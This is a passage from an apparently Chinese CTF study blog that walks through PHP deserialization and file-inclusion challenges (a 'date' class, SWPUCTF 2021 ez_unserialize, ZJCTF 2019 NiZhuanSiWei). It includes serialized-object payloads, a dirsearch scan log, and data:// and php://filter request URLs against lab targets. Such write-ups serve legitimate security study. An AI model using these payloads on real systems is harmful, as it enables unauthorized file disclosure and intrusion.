class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>审计：<br>大概是三个变量a,b,file，还有一个反序列化激活的 __wakeup(),先是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br></code></pre></td></tr></table></figure><p>不让用数组绕过<br>然后是绕过条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>要求a和b弱比较不同，&amp;&amp;a和b的md5和sha1值相同<br>然后看不懂了  </p><blockquote><p>分析：<br>（1）wakeup方法首先禁用了数组，所以不能给成员变量a和b赋值数组，需要使用其他方法绕过下面的md5和sha1。<br>（2）因为比较变量使用的是弱比较（!&#x3D;&#x3D;），则我们可以给a、b赋值同值不同类，例如a&#x3D;1、b&#x3D;’1’，二者md5值和sha1值相同，可以通过检查。<br>（3）变量content接受经过date日期格式化后的变量file。<br>对于date()方法：<br>该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等<br>检测存在则会将格式化字符替换为当前时间的对应部分，否则将字符进行原样输出，同时可用转义字符将格式化字符原样输出<br>（4）uniqid()方法会生成一个唯一的文件名，并与后缀“.txt”拼接成变量uuid。<br>（5）file_put_contents()方法会将content的内容写入uuid表示的文本文档中。对文本文档的内容进行正则匹配，去除内容中的空格和换行符，赋值给变量打他。<br>（6）显示变量data的内容。<br>综上，我们需要绕过检测，为变量file赋值一个不会被date方法格式化的flag路径，读取到flag后，借由变量data显示出来。<br><a href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p></blockquote><p>重要的来了<br>KIMI:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//作用：尝试将$data作为文件路径，读取该路径下的文件内容并输出到浏览器。这里可能存在路径遍历或文件包含漏洞，如果$data的值可控且未经过充分验证。</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br><span class="hljs-comment">//作用：读取刚刚创建的$uuid文件的内容，并使用正则表达式preg_replace()去除其中的空白字符（包括空格、换行符等）。最终结果存储在$data变量中。</span><br></code></pre></td></tr></table></figure><p>最后payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-comment">//同值不同类，通过三个检测</span><br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>-&gt;b=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-comment">//此处file的内容在经过data()方法格式化后显示为/flag</span><br><span class="hljs-variable">$a</span>-&gt;file=<span class="hljs-string">&quot;/f\l\a\g&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//输出:Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9</span><br><br></code></pre></td></tr></table></figure><p>by <a href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p><h2 id="值同类不同"><a href="#值同类不同" class="headerlink" title="值同类不同"></a>值同类不同</h2><p>$this-&gt;a !&#x3D;&#x3D; $this-&gt;b：  </p><p>$this-&gt;a 是整数 1，$this-&gt;b 是字符串 ‘1’。在 PHP 中，它们的值虽然相等，但类型不同，因此 !&#x3D;&#x3D; 比较结果为 true。</p><p>md5($this-&gt;a) &#x3D;&#x3D;&#x3D; md5($this-&gt;b)：</p><p>当你将整数 1 传递给 md5() 函数时，PHP 会将其转换为字符串 ‘1’，因此 md5(1) 和 md5(‘1’) 的结果是相同的。</p><p>sha1($this-&gt;a) &#x3D;&#x3D;&#x3D; sha1($this-&gt;b)：</p><p>同样，sha1() 函数也会将整数 1 转换为字符串 ‘1’，因此 sha1(1) 和 sha1(‘1’) 的结果也是相同的。</p><hr><h2 id="title-note-17date-2025-03-23-13-38-39tags-unseirlize"><a href="#title-note-17date-2025-03-23-13-38-39tags-unseirlize" class="headerlink" title="title: note-17date: 2025-03-23 13:38:39tags: unseirlize"></a>title: note-17<br>date: 2025-03-23 13:38:39<br>tags: unseirlize</h2><h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1><p>没想到我也有能秒反序列化的一天，还以为永远入不了门了<br>拿到题目发现只有一个静态页面<br>然后dirsearch扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs log">[13:31:24] Starting:<br>[13:31:28] 403 -  309B  - /.ht_wsr.txt<br>[13:31:28] 403 -  312B  - /.htaccess.bak1<br>[13:31:28] 403 -  312B  - /.htaccess.save<br>[13:31:28] 403 -  314B  - /.htaccess.sample<br>[13:31:28] 403 -  310B  - /.htaccess_sc<br>[13:31:28] 403 -  313B  - /.htaccess_extra<br>[13:31:28] 403 -  312B  - /.htaccess.orig<br>[13:31:28] 403 -  310B  - /.htaccessBAK<br>[13:31:28] 403 -  312B  - /.htaccess_orig<br>[13:31:28] 403 -  310B  - /.htaccessOLD<br>[13:31:28] 403 -  311B  - /.htaccessOLD2<br>[13:31:28] 403 -  302B  - /.htm<br>[13:31:28] 403 -  303B  - /.html<br>[13:31:28] 403 -  312B  - /.htpasswd_test<br>[13:31:28] 403 -  309B  - /.httr-oauth<br>[13:31:28] 403 -  308B  - /.htpasswds<br>[13:31:45] 200 -    0B  - /flag.php<br>[13:31:56] 200 -   35B  - /robots.txt<br>[13:31:57] 403 -  311B  - /server-status<br>[13:31:57] 403 -  312B  - /server-status/<br></code></pre></td></tr></table></figure><p>直接访问flag.php无果，<br>访问robots.txt  </p><h2 id="notice-1"><a href="#notice-1" class="headerlink" title="notice"></a>notice</h2><p>robots大概作用应该是用来告诉搜索引擎不能爬取哪些页面，没有强制性作用</p><p>在robots里发现&#x2F;cl45s.php<br>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br></code></pre></td></tr></table></figure><p>写了个payload，一次成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&quot;ctf&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">///运行得到:O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>直接get传得到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;<br></code></pre></td></tr></table></figure><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没看懂为啥get传好像传不进去<br>去看大佬的wp</p><p><a href="https://www.nssctf.cn/note/set/3017">https://www.nssctf.cn/note/set/3017</a>   </p><p>原来是这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><em><strong>file_get_contents()</strong></em></h2><p>file_get_contents() 函数在 PHP 中用于读取文件内容或获取远程资源的内容。<br>它可以读取通过 GET 方法传入的 URL 或文件路径，但不能直接读取通过 GET 方法传入的字符串参数。</p><p>所以像这样传入字符串是没用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=welcome to the zjctf<br></code></pre></td></tr></table></figure><p>法一：  </p><p>通过data:&#x2F;&#x2F;伪协议，让字符串传递进去。这里传递纯文本，payload：text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>法二:<br>通过php:&#x2F;&#x2F;input伪协议构造POST请求，传进去的字符串就放在post请求的payload上</p><p>我是选法一了，毕竟直接在url上就能完成<br>data:&#x2F;&#x2F; 协议：<br>data:&#x2F;&#x2F; 协议允许你通过数据 URI 来访问数据。你可以将数据直接嵌入到 URL 中，而不需要创建一个实际的文件。<br>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 打印 &quot;I love PHP&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// text/plain，表示的是文本</span><br><br><span class="hljs-comment">// text/plain;base64, 若纯文本没用可用base64编码</span><br></code></pre></td></tr></table></figure><p>这样就能传入welcome to the zjctf了</p><p>接下来  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(); <br></code></pre></td></tr></table></figure><blockquote><p>检查$file变量中是否包含字符串”flag”。  </p></blockquote><blockquote><p>preg_match(“&#x2F;flag&#x2F;“,$file)：使用正则表达式匹配$file中是否包含”flag”。  </p></blockquote><blockquote><p>如果匹配到”flag”，输出”Not now!”并终止脚本执行。  </p></blockquote><p>由于并不是过滤字符，没法用双写绕过了</p><p>这样先看下面，有提示一个useless.php</p><blockquote><p>根据反序列化代码我们可以推测题目想让我们构造反序列化POC触发useless.php里面的类，<br>要想构造POC我们得知道这个类长什么样，<br>于是问题的矛盾指向了useless.php的源码，<br>这里只能通过php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php来查看加密后的源码（不加密会被当成php执行）</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//n</span>ode4.anna.nssctf.cn:<span class="hljs-number">28681</span>/?text=data:<span class="hljs-regexp">//</span>text/plain,welcome<span class="hljs-variable">%2</span>0to<span class="hljs-variable">%2</span>0the<span class="hljs-variable">%20zjctf</span>&amp;file=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>得到useless.php得内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>那么最后就有:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 